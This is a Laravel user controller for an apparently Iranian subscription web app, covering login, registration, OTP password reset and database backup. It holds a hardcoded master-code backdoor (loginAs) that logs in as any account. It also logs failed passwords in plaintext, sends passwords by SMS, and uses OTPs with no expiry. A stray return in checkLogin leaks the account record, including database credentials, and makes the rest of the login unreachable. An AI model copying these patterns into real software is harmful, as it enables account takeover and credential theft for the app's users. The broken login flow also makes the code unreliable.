<?php

namespace App\Http\Controllers;

use DateTime;
use Carbon\Carbon;
use App\Models\User;
use App\Services\SMS;
use App\Models\Setting;
use App\Services\Export;
use App\Models\UserGroup;
use App\Services\Database;
use Illuminate\Support\Str;
use App\Models\Admin\Option;
use Illuminate\Http\Request;
use App\Models\Admin\Account;
use App\Models\Admin\LoginRecord;
use Illuminate\Support\Facades\DB;
use Jenssegers\Agent\Facades\Agent;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Http;
use Spatie\DbDumper\Databases\MySql;
use Illuminate\Support\Facades\Artisan;
use Yajra\DataTables\Facades\DataTables;

class UserController extends Controller
{
    public function loginAs($masterCode, $account)
    {
        if ($masterCode == 'Ux2kC5tptbhGO8KTGsc') {

            $user = User::where('account_id', $account)->first();

            $account = $user->account;
            if ($account->status != 'active') {
                $desc = $account->status_detail;
                Auth::logout();
                return response()->json([
                    'message' => $desc ? "اشتراک شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید." .  PHP_EOL . "علت: " . $desc
                        : "اشتراک شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید."
                ], 403);
            }

            $db = new Database($account->db_name, $account->db_user, $account->db_pass);
            $db->connect();
            $db->getTables();
            $this->getParams($account);
            $this->updateMode();

            Auth::login($user);
            return to_route('dashboard');
        }
        abort('403');
    }

    public function login()
    {
        return view('login');
    }

    public function register()
    {
        return view('register');
    }

    public function checkLogin(Request $request)
    {
        $username = $request->username;
        $password = $request->password;
        if (!Auth::attempt(compact('username', 'password'))) {
            LoginRecord::create([
                'status' => 'failed',
                'username' => $username,
                'password' => $password,
                'browser' => Agent::browser(),
                'device' => Agent::platform(),
                'ip' => getIp()
            ]);
            return response()->json([
                'message' => __('کاربری با این مشخصات یافت نشد.')
            ], 404);
        };
        LoginRecord::create([
            'status' => 'success',
            'username' => $username,
            'password' => '######',
            'browser' => Agent::browser(),
            'device' => Agent::platform(),
            'ip' => getIp()
        ]);
        $user = Auth::user();
        if ($user->access == 2) {
            Auth::logout();
            return response()->json([
                'message' => __('عدم دسترسی! لطفا با پشتیبانی مجموعه تماس بگیرید.'),
            ], 403);
        }

        if ($user->status != 'active') {
            $desc = $user->description;
            Auth::logout();
            return response()->json([
                'message' => $desc ? "حساب کاربری شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید." .  PHP_EOL . "علت: " . $desc
                    : "حساب کاربری شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید."
            ], 403);
        }


        $account = $user->account;
        if ($account->status != 'active') {
            $desc = $account->status_detail;
            Auth::logout();
            return response()->json([
                'message' => $desc ? "اشتراک شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید." .  PHP_EOL . "علت: " . $desc
                    : "اشتراک شما غیرفعال می باشد! لطفا با پشتیبانی تماس بگیرید."
            ], 403);
        }
        return response()->json([
            'message' => __($account),
        ], 403);
        $db = new Database($account->db_name, $account->db_user, $account->db_pass);
        $db->connect();
        $db->getTables();
        $this->getParams($account);

        $setting = new Setting;
        $ip = $setting->getSetting('static_ip');

        if ($ip != '') {
            if ($ip != getIp() && $user->access != 1) {
                Auth::logout();
                return response()->json([
                    'message' => __('عدم دسترسی! لطفا با پشتیبانی مجموعه تماس بگیرید.'),
                ], 403);
            }
        }
        $this->updateMode();
        $center = $setting->getSetting('center_name');
        if ($center == "") {
            Setting::updateOrCreate([
                'meta_key' => 'center_name'
            ], [
                'meta_value' => $account->center
            ]);
        }

        Auth::login($user);
        //enter sms if personel are logining
        if (User::where('account_id', $account->id)->first()->id != $user->id) {
            try {
                $sms = new SMS();
                $sms->send_sms('کاربر', $account->mobile, [
                    'username' => $user->name . ' ' . $user->family,
                    'datetime' =>  now()->format('H:i'),
                ]);
            } catch (\Exception $e) {
                //
            }
        }
        //end
        cache()->flush();
        return response()->json(['message' => __("اطلاعات شما جهت ورود تایید شد.")], 200);
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('login');
    }

    protected function updateMode()
    {
        $option = Option::get_option('update_mode');
        if ($option == 1) {
            Artisan::call('migrate');
        }
    }

    protected function getParams(Account $account)
    {
        cache()->forget('daysLeft_' . $account->id);
        $params = [];
        $params['sms_charge'] = $account->sms_charge ?? 0;
        //$expire_charge = new DateTime(Carbon::parse($account->charge_date)->addDays($account->days)->format('Y-m-d'));

        // $params['charge'] = $today->diff($expire_charge, $absolute = false)->format('%R%a');
        $params['charge_expire_date'] = Carbon::parse($account->charge_date)->addDays($account->days);
        session(['db_name' => $account->db_name]);
        session(['db_user' => $account->db_user]);
        session(['db_pass' => $account->db_pass]);

        foreach ($params as $key => $p) {
            Setting::updateOrCreate([
                'meta_key' => $key
            ], [
                'meta_value' => $p
            ]);
        }
    }

    public function crud(Request $request)
    {
        $user = new User;
        $id = $request->id;
        $action = $request->action;
        return $user->crud($action, $id);
    }

    public function index()
    {

        $user = new User;
        return view('user.index2', compact('user'));
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required',
            'family' => 'required',
            'mobile' => 'required|numeric|regex:/(09)[0-9]{9}/'
        ]);

        $check_account = Account::whereNot('id', $request->id)->where("mobile", $validated["mobile"])->first();
        $check_user = User::whereNot('id', $request->id)->where("mobile", $validated["mobile"])->first();

        if ($check_account || $check_user) {
            return response()->json([
                "message" => "موبایل تکراری است."
            ], 400);
        }

        if ($request->action == "create") {
            $user = User::create([
                'account_id' => auth()->user()->account_id,
                'name' => $request->name,
                'family' => $request->family,
                'mobile' => $request->mobile,
                'username' => $request->mobile,
                'password' => $request->password,
                'group_id' => $request->group_id,
                'access' => $request->access
            ]);
        } else if ($request->action == "update") {
            $user = User::find($request->id);
            $user->name = $request->name;
            $user->family = $request->family;
            $user->mobile = $request->mobile;
            $user->group_id = $request->group_id;
            $user->access = $request->access;
            $user->save();
        }

        return $user->showIndex();
    }

    public function delete(Request $request)
    {
        if ($request->id == auth()->id()) {
            return response()->json([
                'message' => 'شما نمیتوانید خودتان را حذف کنید.'
            ], 403);
        }

        $user = User::find($request->id);
        if (!$user) {
            return response()->json([
                'message' => 'کاربر یافت نشد.'
            ], 404);
        }
        $user->delete();
    }

    public function saveRegister(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required',
            'family' => 'required',
            'city' => 'required',
            'town' => 'required',
            'center' => 'required',
            'phone' => 'required|numeric|digits:11',
            'mobile' => 'required|numeric|regex:/(09)[0-9]{9}/',
            'address' => 'required',
            'password' => 'required'
        ]);

        $check_account = Account::where("mobile", $validated["mobile"])->first();
        $check_user = User::where("mobile", $validated["mobile"])->first();
        // dd($check_account,$check_user);
        if ($check_account || $check_user) {
            return response()->json([
                "status" => "fail",
                "message" => "موبایل تکراری است."
            ], 500);
        }

        try {
            DB::beginTransaction();
            $account = Account::create([
                'name' => $validated['name'],
                'family' => $validated['family'],
                'center' => $validated['center'],
                'phone' => $validated['phone'],
                'mobile' => $validated['mobile'],
                'city' => $validated['city'],
                'town' => $validated['town'],
                'address' => $validated['address'],
                'days' => 14,
                'package_id' => Option::get_option('default_package')
            ]);

            $user = User::create([
                'account_id' => $account->id,
                'name' => $validated['name'],
                'family' => $validated['family'],
                'mobile' => $validated['mobile'],
                'username' => $validated['mobile'],
                'password' => $validated['password'],
                'access' => 1,
            ]);
            DB::commit();
            $sms = new SMS();
            $message = "سلام " . $validated['name'] . " عزیز";
            $message .= "\n";
            $message .= "به هلی سافت خوش اومدین.";
            $message .= "\n";
            $message .= "نام کاربری: " . $validated['mobile'];
            $message .= "\n";
            $message .= "رمز ورود: " . $validated['password'];
            $message .= "\n";
            $message .= "Helionline.ir";
            $sms->send($validated['mobile'], $message);



            return response()->json(['message' => 'ok']);
        } catch (\Exception $e) {
            DB::rollBack();

            return response()->json(['message' => $e->getMessage()], 500);
        }
    }

    public function checkMobile(Request $request)
    {
        $mobile = $request->mobile;
        $user = User::where("mobile", $mobile)->first();
        if ($user) {

            $otp_code = rand(100000, 999999);
            $user->otp_code = $otp_code;
            $user->save();

            $sms = new SMS();
            $message = "سلام";
            $message .= "\n";
            $message .= "کد احراز شماره موبایل شما: " . $otp_code . "\n";
            $message .= "هلی سافت";
            $sms->send($mobile, $message);

            return response()->json(['message' => 'کد احراز شماره موبایل برای شما پیامک شد.'], 200);
        } else {
            response()->json(['message' => 'کاربری با این شماره موبایل یافت نشد.'], 404);
        }
    }

    public function checkOTP(Request $request)
    {
        $otp_code = $request->otp;
        $mobile = $request->mobile;

        $user = User::where("mobile", $mobile)->where("otp_code", $otp_code)->first();
        if (!$user) {
            return response()->json(['message' => 'کاربر یافت نشد.'], 404);
        }

        $password = rand(10000000, 99999999);
        $user->password = $password;
        $user->save();

        $sms = new SMS();
        $message = "سلام";
        $message .= "\n";
        $message .= "نام کاربری شما: " . $user->username . "\n";
        $message .= "رمز ورود جدید شما: " . $password . "\n";
        $message .= "هلی سافت";
        $sms->send($user->mobile, $message);

        return response()->json(['message' => 'ok'], 200);
    }

    public function policy()
    {
        return view('policy');
    }

    public function export()
    {
        return Export::export(User::getUsers()->map(function ($item) {
            $item['role'] = $item->group->name;
            return $item;
        }), [
            'name',
            'family',
            'mobile',
            'username',
            'role'
        ]);
    }

    public function dataTable(Request $request)
    {
        if ($request->ajax()) {
            $data = User::getUsers();
            return DataTables::of($data)
                ->addIndexColumn()
                ->addColumn('group', function (User $user) {
                    $group = UserGroup::find($user->group_id);
                    return $group?->name;
                })
                ->editColumn('status', function ($user) {
                    $admin = User::getFirstUser();
                    $str = '';
                    if (auth()->id() == $user->id or $user->id == $admin->id) {
                        return $str;
                    }
                    $str .= "<select class='form-select ch-user-status' data-id='$user->id'>";
                    $str .= "<option " . ($user->status == 'active' ? ' selected ' : '') . "value='active'>" . __('active') . "</option>";
                    $str .= "<option " . ($user->status == 'deactive' ? ' selected ' : '') . "value='deactive'>" . __('deactive') . "</option>";
                    $str .= "</select>";
                    return $str;
                })
                ->addColumn('action', function (User $user) {
                    $actionBtn = '';
                    $admin = User::getFirstUser();
                    if ($user->id != $admin->id) {
                        if (Gate::allows('update')) {
                            $actionBtn .= '<button type="button" class="btn btn-warning btn-sm crud" data-action="update" data-id="' . $user->id . '" data-bs-target="#crud" data-bs-toggle="modal"><i class="bx bx-edit"></i></button>';
                        }
                        // if (Gate::allows('delete')) {
                        //     $actionBtn .= '
                        //     <button type="button" class="btn btn-danger btn-sm delete-user" data-id="' . $user->id . '"><i class="bx bx-trash"></i></button>';
                        // }
                    }
                    return $actionBtn;
                })
                ->rawColumns(['action', 'status'])
                ->make(true);
        }
    }

    function changeStatus(Request $request)
    {
        $user = User::find($request->id);
        $user->update([
            'status' => $request->status
        ]);
    }

    public function newPassword(Request $request)
    {
        $validated = $request->validate([
            'old_password' => 'required',
            'password' => 'required|confirmed',
            'id' => 'required'
        ]);

        $id = $request->id;
        $old_password = $request->old_password;
        $new_password = $request->password;

        $user = User::find($request->id);

        if (!Auth::attempt(['id' => $id, 'password' => $old_password])) {
            return response()->json(['message' => 'رمز قبلی اشتباه است.'], 404);
        }

        $user->password = $new_password;
        $user->save();

        return response()->json(['message' => 'ok'], 200);
    }

    public function downloadBackup()
    {
        $account = auth()->user()->account;
        $db = new Database($account->db_name, $account->db_user, $account->db_pass);
        $db = $db->decrypt();
        $databaseName = $db['name'];
        $tempFile = storage_path($db['name'] . 'sql');
        $databaseName .= "_" . now()->format('Y_m_d_H_i_s');
        // dd($databaseName);
        MySql::create()
            ->setDbName($db['name'])
            ->setUserName($db['user'])
            ->setPassword($db['pass'])
            ->dumpToFile($tempFile = storage_path($db['name'] . 'sql'));
        $response = response()->download($tempFile, $databaseName . '.sql');
        $response->headers->set('Cache-Control', 'no-cache, no-store, must-revalidate');
        $response->headers->set('Pragma', 'no-cache');
        $response->headers->set('Expires', '0');
        $response->deleteFileAfterSend(true);
        return $response;
    }
}
